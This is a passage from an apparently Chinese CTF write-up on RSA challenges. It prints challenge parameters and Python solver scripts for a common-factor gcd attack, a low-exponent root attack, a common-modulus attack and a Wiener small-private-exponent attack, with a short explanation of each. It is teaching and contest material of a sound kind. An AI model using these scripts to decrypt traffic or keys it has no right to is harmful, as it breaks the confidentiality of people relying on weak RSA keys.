punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n ="</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"e1 ="</span><span class="token punctuation">,</span> e1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c1 ="</span><span class="token punctuation">,</span> c1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"e2 ="</span><span class="token punctuation">,</span> e2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c2 ="</span><span class="token punctuation">,</span> c2<span class="token punctuation">)</span></pre></td></tr></table></figure><p>output</p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre># task1</pre></td></tr><tr><td data-num="2"></td><td><pre>e = 65537</pre></td></tr><tr><td data-num="3"></td><td><pre>n1 = 14611545605107950827581005165327694782823188603151768169731431418361306231114985037775917461433925308054396970809690804073985835376464629860609710292181368600618626590498491850404503443414241455487304448344892337877422465715709154238653505141605904184985311873763495761345722155289457889686019746663293720106874227323699288277794292208957172446523420596391114891559537811029473150123641624108103676516754449492805126642552751278309634846777636042114135990516245907517377320190091400729277307636724890592155256437996566160995456743018225013851937593886086129131351582958811003596445806061492952513851932238563627194553</pre></td></tr><tr><td data-num="4"></td><td><pre>c1 = 965075803554932988664271816439183802328812013694203741320763105376036912584995031647672348468111310423680858101990670067065306237596121664884353679987689532305437801346923070145524106271337770666947677115752724993307387122132705797012726237073550669419110046308257408484535063515678066777681017211510981429273346928022971149411064556225001287399141306136081722471075032423079692908380267160214143720516748000734987068685104675254411687005690312116824966036851568223828884335112144637268090397158532937141122654075952730052331573980701136378212002956719295192733955673315234274064519957670199895100508623561838510479</pre></td></tr><tr><td data-num="5"></td><td><pre>n2 = 20937478725109983803079185450449616567464596961348727453817249035110047585580142823551289577145958127121586792878509386085178452171112455890429474457797219202827030884262273061334752493496797935346631509806685589179618367453992749753318273834113016237120686880514110415113673431170488958730203963489455418967544128619234394915820392908422974075932751838012185542968842691824203206517795693893863945100661940988455695923511777306566419373394091907349431686646485516325575494902682337518438042711296437513221448397034813099279203955535025939120139680604495486980765910892438284945450733375156933863150808369796830892363</pre></td></tr><tr><td data-num="6"></td><td><pre>c2 = 11536506945313747180442473461658912307154460869003392732178457643224057969838224601059836860883718459986003106970375778443725748607085620938787714081321315817144414115589952237492448483438910378865359239575169326116668030463275817609827626048962304593324479546453471881099976644410889657248346038986836461779780183411686260756776711720577053319504691373550107525296560936467435283812493396486678178020292433365898032597027338876045182743492831814175673834198345337514065596396477709839868387265840430322983945906464646824470437783271607499089791869398590557314713094674208261761299894705772513440948139429011425948090</pre></td></tr><tr><td data-num="7"></td><td><pre># task2</pre></td></tr><tr><td data-num="8"></td><td><pre>e = 7</pre></td></tr><tr><td data-num="9"></td><td><pre>n = 14157878492255346300993349653813018105991884577529909522555551468374307942096214964604172734381913051273745228293930832314483466922529240958994897697475939867025561348042725919663546949015024693952641936481841552751484604123097148071800416608762258562797116583678332832015617217745966495992049762530373531163821979627361200921544223578170718741348242012164115593777700903954409103110092921578821048933346893212805071682235575813724113978341592885957767377587492202740185970828629767501662195356276862585025913615910839679860669917255271734413865211340126544199760628445054131661484184876679626946360753009512634349537</pre></td></tr><tr><td data-num="10"></td><td><pre>c = 10262871020519116406312674685238364023536657841034751572844570983750295909492149101500869806418603732181350082576447594766587572350246675445508931577670158295558641219582729345581697448231116318080456112516700717984731655900726388185866905989088504004805024490513718243036445638662260558477697146032055765285263446084259814560197549018044099935158351931885157616527235283229066145390964094929007056946332051364474528453970904251050605631514869007890625</pre></td></tr><tr><td data-num="11"></td><td><pre># task3</pre></td></tr><tr><td data-num="12"></td><td><pre>n = 18819509188106230363444813350468162056164434642729404632983082518225388069544777374544142317612858448345344137372222988033366528086236635213756227816610865045924357232188768913642158448603346330462535696121739622702200540344105464126695432011739181531217582949804939555720700457350512898322376591813135311921904580338340203569582681889243452495363849558955947124975293736509426400460083981078846138740050634906824438689712748324336878791622676974341814691041262280604277357889892211717124319329666052810029131172229930723477981468761369516771720250571713027972064974999802168017946274736383148001865929719248159075729</pre></td></tr><tr><td data-num="13"></td><td><pre>e1 = 2519901323</pre></td></tr><tr><td data-num="14"></td><td><pre>c1 = 3230779726225544872531441169009307072073754578761888387983403206364548451496736513905460381907928107310030086346589351105809028599650303539607581407627819797944337398601400510560992462455048451326593993595089800150342999021874734748066692962362650540036002073748766509347649818139304363914083879918929873577706323599628031618641793074018304521243460487551364823299685052518852685706687800209505277426869140051056996242882132616256695188870782634310362973153766698286258946896866396670872451803114280846709572779780558482223393759475999103607704510618332253710503857561025613632592682931552228150171423846203875344870</pre></td></tr><tr><td data-num="15"></td><td><pre>e2 = 3676335737</pre></td></tr><tr><td data-num="16"></td><td><pre>c2 = 940818595622279161439836719641707846790294650888799822335007385854166736459283129434769062995122371073636785371800857633841379139761091890426137981113087519934854663776695944489430385663011713917022574342380155718317794204988626116362865144125136624722782309455452257758808172415884403909840651554485364309237853885251876941477098008690389600544398998669635962495989736021020715396415375890720335697504837045188626103142204474942751410819466379437091569610294575687793060945525108986660851277475079994466474859114092643797418927645726430175928247476884879817034346652560116597965191204061051401916282814886688467861</pre></td></tr></table></figure><p>payload</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> gmpy2</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> math <span class="token keyword">import</span> gcd</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> invert</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">from</span> libnum <span class="token keyword">import</span> n2s<span class="token punctuation">,</span>xgcd</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment"># task1  分解公因子</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>e <span class="token operator">=</span> <span class="token number">65537</span></pre></td></tr><tr><td data-num="8"></td><td><pre>n1 <span class="token operator">=</span> <span class="token number">14611545605107950827581005165327694782823188603151768169731431418361306231114985037775917461433925308054396970809690804073985835376464629860609710292181368600618626590498491850404503443414241455487304448344892337877422465715709154238653505141605904184985311873763495761345722155289457889686019746663293720106874227323699288277794292208957172446523420596391114891559537811029473150123641624108103676516754449492805126642552751278309634846777636042114135990516245907517377320190091400729277307636724890592155256437996566160995456743018225013851937593886086129131351582958811003596445806061492952513851932238563627194553</span></pre></td></tr><tr><td data-num="9"></td><td><pre>c1 <span class="token operator">=</span> <span class="token number">965075803554932988664271816439183802328812013694203741320763105376036912584995031647672348468111310423680858101990670067065306237596121664884353679987689532305437801346923070145524106271337770666947677115752724993307387122132705797012726237073550669419110046308257408484535063515678066777681017211510981429273346928022971149411064556225001287399141306136081722471075032423079692908380267160214143720516748000734987068685104675254411687005690312116824966036851568223828884335112144637268090397158532937141122654075952730052331573980701136378212002956719295192733955673315234274064519957670199895100508623561838510479</span></pre></td></tr><tr><td data-num="10"></td><td><pre>n2 <span class="token operator">=</span> <span class="token number">20937478725109983803079185450449616567464596961348727453817249035110047585580142823551289577145958127121586792878509386085178452171112455890429474457797219202827030884262273061334752493496797935346631509806685589179618367453992749753318273834113016237120686880514110415113673431170488958730203963489455418967544128619234394915820392908422974075932751838012185542968842691824203206517795693893863945100661940988455695923511777306566419373394091907349431686646485516325575494902682337518438042711296437513221448397034813099279203955535025939120139680604495486980765910892438284945450733375156933863150808369796830892363</span></pre></td></tr><tr><td data-num="11"></td><td><pre>c2 <span class="token operator">=</span> <span class="token number">11536506945313747180442473461658912307154460869003392732178457643224057969838224601059836860883718459986003106970375778443725748607085620938787714081321315817144414115589952237492448483438910378865359239575169326116668030463275817609827626048962304593324479546453471881099976644410889657248346038986836461779780183411686260756776711720577053319504691373550107525296560936467435283812493396486678178020292433365898032597027338876045182743492831814175673834198345337514065596396477709839868387265840430322983945906464646824470437783271607499089791869398590557314713094674208261761299894705772513440948139429011425948090</span></pre></td></tr><tr><td data-num="12"></td><td><pre>q<span class="token operator">=</span>gcd<span class="token punctuation">(</span>n1<span class="token punctuation">,</span>n2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>p<span class="token operator">=</span>n1<span class="token operator">//</span>q</pre></td></tr><tr><td data-num="14"></td><td><pre>r<span class="token operator">=</span>n2<span class="token operator">//</span>q</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>n2s<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token comment"># task2 低加密指数攻击</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>e <span class="token operator">=</span> <span class="token number">7</span></pre></td></tr><tr><td data-num="20"></td><td><pre>n <span class="token operator">=</span> <span class="token number">14157878492255346300993349653813018105991884577529909522555551468374307942096214964604172734381913051273745228293930832314483466922529240958994897697475939867025561348042725919663546949015024693952641936481841552751484604123097148071800416608762258562797116583678332832015617217745966495992049762530373531163821979627361200921544223578170718741348242012164115593777700903954409103110092921578821048933346893212805071682235575813724113978341592885957767377587492202740185970828629767501662195356276862585025913615910839679860669917255271734413865211340126544199760628445054131661484184876679626946360753009512634349537</span></pre></td></tr><tr><td data-num="21"></td><td><pre>c <span class="token operator">=</span> <span class="token number">10262871020519116406312674685238364023536657841034751572844570983750295909492149101500869806418603732181350082576447594766587572350246675445508931577670158295558641219582729345581697448231116318080456112516700717984731655900726388185866905989088504004805024490513718243036445638662260558477697146032055765285263446084259814560197549018044099935158351931885157616527235283229066145390964094929007056946332051364474528453970904251050605631514869007890625</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>c<span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span> <span class="token comment">#c 开 e 次根 m=pow (c,d,n) d=invert (e,(p-1)*(q-1))</span></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token comment"># task3 共模攻击</span></pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre>n <span class="token operator">=</span> <span class="token number">18819509188106230363444813350468162056164434642729404632983082518225388069544777374544142317612858448345344137372222988033366528086236635213756227816610865045924357232188768913642158448603346330462535696121739622702200540344105464126695432011739181531217582949804939555720700457350512898322376591813135311921904580338340203569582681889243452495363849558955947124975293736509426400460083981078846138740050634906824438689712748324336878791622676974341814691041262280604277357889892211717124319329666052810029131172229930723477981468761369516771720250571713027972064974999802168017946274736383148001865929719248159075729</span></pre></td></tr><tr><td data-num="28"></td><td><pre>e1 <span class="token operator">=</span> <span class="token number">2519901323</span></pre></td></tr><tr><td data-num="29"></td><td><pre>c1 <span class="token operator">=</span> <span class="token number">3230779726225544872531441169009307072073754578761888387983403206364548451496736513905460381907928107310030086346589351105809028599650303539607581407627819797944337398601400510560992462455048451326593993595089800150342999021874734748066692962362650540036002073748766509347649818139304363914083879918929873577706323599628031618641793074018304521243460487551364823299685052518852685706687800209505277426869140051056996242882132616256695188870782634310362973153766698286258946896866396670872451803114280846709572779780558482223393759475999103607704510618332253710503857561025613632592682931552228150171423846203875344870</span></pre></td></tr><tr><td data-num="30"></td><td><pre>e2 <span class="token operator">=</span> <span class="token number">3676335737</span></pre></td></tr><tr><td data-num="31"></td><td><pre>c2 <span class="token operator">=</span> <span class="token number">940818595622279161439836719641707846790294650888799822335007385854166736459283129434769062995122371073636785371800857633841379139761091890426137981113087519934854663776695944489430385663011713917022574342380155718317794204988626116362865144125136624722782309455452257758808172415884403909840651554485364309237853885251876941477098008690389600544398998669635962495989736021020715396415375890720335697504837045188626103142204474942751410819466379437091569610294575687793060945525108986660851277475079994466474859114092643797418927645726430175928247476884879817034346652560116597965191204061051401916282814886688467861</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre>s1<span class="token punctuation">,</span>s2<span class="token punctuation">,</span>_<span class="token operator">=</span>xgcd<span class="token punctuation">(</span>e1<span class="token punctuation">,</span>e2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token keyword">if</span> s1<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    s1<span class="token operator">=</span><span class="token operator">-</span>s1</pre></td></tr><tr><td data-num="36"></td><td><pre>    c1<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>invert<span class="token punctuation">(</span>c1<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token keyword">if</span> s2<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    s2<span class="token operator">=</span><span class="token operator">-</span>s2</pre></td></tr><tr><td data-num="39"></td><td><pre>    c2<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>invert<span class="token punctuation">(</span>c2<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>n2s<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span>s1<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">*</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c2<span class="token punctuation">,</span>s2<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">%</span>n<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>在此普及一下<br />
低加密指数分解攻击<br />
 e=2 把密文 c 开平方求解<br />
 RSA 加密，由于 e 只有 2，相当于把明文 m 平方而已，得到的 c 也比 n 小很多。尝试把 c 开根号看能否得到明文。一般的 python 开根号方法精度较低，对大整数开出来的根号准确度低。发现使用 gmpy2 库可以对大整数开根号。iroot<br />
e=2 Rabin 加密中的 N 可被分解<br />
 e<mark>2, 并不都是 Rabin 加密，但是 e</mark>2 是 Rabin 加密典型特征</p>
<p>共模攻击<br />
明文 m、模数 n 相同，公钥指数 e、密文 c 不同，gcd (e1,e2)==1<br />
 对同一明文的多次加密使用相同的模数和不同的公钥指数可能导致共模攻击。</p>
<h2 id="multi-prime-rsa"><a class="anchor" href="#multi-prime-rsa">#</a> Multi Prime RSA</h2>
<p>源码</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> invert</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> libnum <span class="token keyword">import</span> s2n</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">from</span> secret <span class="token keyword">import</span> flag</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>n <span class="token operator">=</span> p <span class="token operator">*</span> q</pre></td></tr><tr><td data-num="9"></td><td><pre>d <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>e <span class="token operator">=</span> invert<span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>s2n<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"n = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>n<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"e = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"c = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token comment">#n = 507419170088344932990702256911694788408493968749527614421614568612944144764889717229444020813658893362983714454159980719026366361318789415279417172858536381938870379267670180128174798344744371725609827872339512302232610590888649555446972990419313445687852636305518801236132032618350847705234643521557851434711389664130274468354405273873218264222293858509477860634889001898462547712800153111774564939279190835857445378261920532206352364005840238252284065587291779196975457288580812526597185332036342330147250312262816994625317482869849388424397437470502449815132000588425028055964432298176942124697105509057090546600330760364385753313923003549670107599757996810939165300581847068233156887269181096893089415302163770884312255957584660964506028002922164767453287973102961910781312351686488047510932997937700597992705557881172640175117476017503918294534205898046483981707558521558992058512940087192655700351675718815723840568640509355338482631416345193176708501897458649841539192993142790402734898948352382350766125000186026261167277014748183012844440603384989647664190074853086693408529737767147592432979469020671772152652865219092597717869942730499507426269170189547020660681363276871874469322437194397171763927907099922324375991793759</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token comment">#e = 77310199867448677782081572109343472783781135641712597643597122591443011229091533516758925238949755491395489408922437493670252550920826641442189683907973926843505436730014899918587477913032286153545247063493885982941194996251799882984145155733050069564485120660716110828110738784644223519725613280140006783618393995138076030616463398284819550627612102010214315235269945251741407899692274978642663650687157736417831290404871181902463904311095448368498432147292938825418930527188720696497596867575843476810225152659244529481480993843168383016583068747733118703000287423374094051895724494193455175131120243097065270804457787026492578916584536863548445813916819417857064037664101684455000184987531252344582899589746272173970083733130106407810619258077266603898529285634495710846838011858287024329514491058790557305041389614650730267774482954666726949886313386881066593946789460028399523245777171320319444673551268379126203862576627540177888290265714418064334752499940587750374552330008143708562065940245637685833371348603338834447212248648869514585047871442060412622164276894766238383894693759347590977926306581080390685360615407766600573527565016914830132066428454738135380178959590692145577418811677639050929791996313180297924833690095</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token comment">#c = 165251729917394529793163344300848992394021337429474789711805041655116845722480301677817165053253655027459227404782607373107477419083333844871948673626672704233977397989843349633720167495862807995411682262559392496273163155214888276398332204954185252030616473235814999366132031184631541209554169938146205402400412307638567132128690379079483633171535375278689326189057930259534983374296873110199636558962144635514392282351103900375366360933088605794654279480277782805401749872568584335215630740265944133347038070337891035560658434763924576508969938866566235926587685108811154229747423410476421860059769485356567301897413767088823807510568561254627099309752215808220067495561412081320541540679503218232020279947159175547517811501280846596226165148013762293861131544331444165070186672186027410082671602892508739473724143698396105392623164025712124329254933353509384748403154342322725203183050328143736631333990445537119855865348221215277608372952942702104088940952142851523651639574409075484106857403651453121036577767672430612728022444370874223001778580387635197325043524719396707713385963432915855227152371800527536048555551237729690663544828830627192867570345853910196397851763591543484023134551876591248557980182981967782409054277224</span></pre></td></tr></table></figure><p>e 太大 可使用算法从 e 中快速推断出 d 的值。 可使用 Wiener’s Attack 进行解 d<br />
 求出 d 可直接求 m</p>
<p>在此贴一个维纳攻击的脚本</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> ContinuedFractions<span class="token punctuation">,</span> Arithmetic<span class="token punctuation">,</span> RSAvulnerableKeyGenerator</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">def</span> <span class="token function">hack_RSA</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token triple-quoted-string string">'''</pre></td></tr><tr><td data-num="6"></td><td><pre>    Finds d knowing (e,n)</pre></td></tr><tr><td data-num="7"></td><td><pre>    applying the Wiener continued fraction attack</pre></td></tr><tr><td data-num="8"></td><td><pre>    '''</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    frac <span class="token operator">=</span> ContinuedFractions<span class="token punctuation">.</span>rational_to_contfrac<span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    convergents <span class="token operator">=</span> ContinuedFractions<span class="token punctuation">.</span>convergents_from_contfrac<span class="token punctuation">(</span>frac<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    </pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">for</span> <span class="token punctuation">(</span>k<span class="token punctuation">,</span>d<span class="token punctuation">)</span> <span class="token keyword">in</span> convergents<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        </pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token comment">#check if d is actually the key</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token keyword">if</span> k<span class="token operator">!=</span><span class="token number">0</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>e<span class="token operator">*</span>d<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>k <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>            phi <span class="token operator">=</span> <span class="token punctuation">(</span>e<span class="token operator">*</span>d<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>k</pre></td></tr><tr><td data-num="17"></td><td><pre>            s <span class="token operator">=</span> n <span class="token operator">-</span> phi <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="18"></td><td><pre>            <span class="token comment"># check if the equation x^2 - s*x + n = 0</span></pre></td></tr><tr><td data-num="19"></td><td><pre>            <span class="token comment"># has integer roots</span></pre></td></tr><tr><td data-num="20"></td><td><pre>            discr <span class="token operator">=</span> s<span class="token operator">*</span>s <span class="token operator">-</span> <span class="token number">4</span><span class="token operator">*</span>n</pre></td></tr><tr><td data-num="21"></td><td><pre>            <span class="token keyword">if</span><span class="token punctuation">(</span>discr<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>                t <span class="token operator">=</span> Arithmetic<span class="token punctuation">.</span>is_perfect_square<span class="token punctuation">(</span>discr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>                <span class="token keyword">if</span> t<span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>s<span class="token operator">+</span>t<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hacked!"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>                    <span class="token keyword">return</span> d</pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    n <span class="token operator">=</span> <span class="token number">507419170088344932990702256911694788408493968749527614421614568612944144764889717229444020813658893362983714454159980719026366361318789415279417172858536381938870379267670180128174798344744371725609827872339512302232610590888649555446972990419313445687852636305518801236132032618350847705234643521557851434711389664130274468354405273873218264222293858509477860634889001898462547712800153111774564939279190835857445378261920532206352364005840238252284065587291779196975457288580812526597185332036342330147250312262816994625317482869849388424397437470502449815132000588425028055964432298176942124697105509057090546600330760364385753313923003549670107599757996810939165300581847068233156887269181096893089415302163770884312255957584660964506028002922164767453287973102961910781312351686488047510932997937700597992705557881172640175117476017503918294534205898046483981707558521558992058512940087192655700351675718815723840568640509355338482631416345193176708501897458649841539192993142790402734898948352382350766125000186026261167277014748183012844440603384989647664190074853086693408529737767147592432979469020671772152652865219092597717869942730499507426269170189547020660681363276871874469322437194397171763927907099922324375991793759</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    e <span class="token operator">=</span> <span class="token number">77310199867448677782081572109343472783781135641712597643597122591443011229091533516758925238949755491395489408922437493670252550920826641442189683907973926843505436730014899918587477913032286153545247063493885982941194996251799882984145155733050069564485120660716110828110738784644223519725613280140006783618393995138076030616463398284819550627612102010214315235269945251741407899692274978642663650687157736417831290404871181902463904311095448368498432147292938825418930527188720696497596867575843476810225152659244529481480993843168383016583068747733118703000287423374094051895724494193455175131120243097065270804457787026492578916584536863548445813916819417857064037664101684455000184987531252344582899589746272173970083733130106407810619258077266603898529285634495710846838011858287024329514491058790557305041389614650730267774482954666726949886313386881066593946789460028399523245777171320319444673551268379126203862576627540177888290265714418064334752499940587750374552330008143708562065940245637685833371348603338834447212248648869514585047871442060412622164276894766238383894693759347590977926306581080390685360615407766600573527565016914830132066428454738135380178959590692145577418811677639050929791996313180297924833690095</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    d<span class="token operator">=</span>hack_RSA<span class="token punctuation">(</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    c <span class="token operator">=</span> <span class="token number">165251729917394529793163344300848992394021337429474789711805041655116845722480301677817165053253655027459227404782607373107477419083333844871948673626672704233977397989843349633720167495862807995411682262559392496273163155214888276398332204954185252030616473235814999366132031184631541209554169938146205402400412307638567132128690379079483633171535375278689326189057930259534983374296873110199636558962144635514392282351103900375366360933088605794654279480277782805401749872568584335215630740265944133347038070337891035560658434763924576508969938866566235926587685108811154229747423410476421860059769485356567301897413767088823807510568561254627099309752215808220067495561412081320541540679503218232020279947159175547517811501280846596226165148013762293861131544331444165070186672186027410082671602892508739473724143698396105392623164025712124329254933353509384748403154342322725203183050328143736631333990445537119855865348221215277608372952942702104088940952142851523651639574409075484106857403651453121036577767672430612728022444370874223001778580387635197325043524719396707713385963432915855227152371800527536048555551237729690663544828830627192867570345853910196397851763591543484023134551876591248557980182981967782409054277224</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    r<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    flag<span class="token operator">=</span>long_to_bytes<span class="token punctuation">(</span>r<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>main<span class="token 